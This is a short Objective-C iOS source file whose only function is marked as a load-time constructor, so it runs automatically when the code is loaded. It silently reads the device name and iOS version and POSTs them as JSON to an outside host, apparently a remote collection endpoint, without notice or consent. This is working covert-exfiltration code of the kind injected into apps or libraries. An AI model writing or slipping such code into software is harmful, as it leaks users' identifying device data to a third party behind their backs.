#import <UIKit/UIKit.h>

__attribute__((constructor))
static void sendDeviceInfo() {
    // Get the device name and iOS version
    NSString *deviceName = [[UIDevice currentDevice] name];  // Device name on iOS
    NSString *osVersion = [[UIDevice currentDevice] systemVersion];  // iOS version
    
    // URL for sending the data
    NSURL *url = [NSURL URLWithString:@"https://chillysilly.run.place/testbank.php"];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];

    // Prepare the device info as a dictionary
    NSDictionary *deviceInfo = @{
        @"deviceName": deviceName ?: @"Unknown Device",  // Ensure we have a fallback
        @"osVersion": osVersion ?: @"Unknown Version"
    };
    
    // Serialize the dictionary into JSON
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:deviceInfo options:0 error:&error];
    
    // Handle potential JSON serialization errors
    if (!jsonData) {
        NSLog(@"Failed to serialize JSON: %@", error);
        return;
    }
    
    [request setHTTPBody:jsonData];
    
    // Create a data task to send the POST request
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"Error: %@", error);
            return;
        }

        if ([(NSHTTPURLResponse *)response statusCode] == 200) {
            NSLog(@"Device info sent successfully.");
        } else {
            NSLog(@"Failed to send device info. Status Code: %ld", (long)[(NSHTTPURLResponse *)response statusCode]);
        }
    }];
    
    // Start the network request
    [task resume];
}
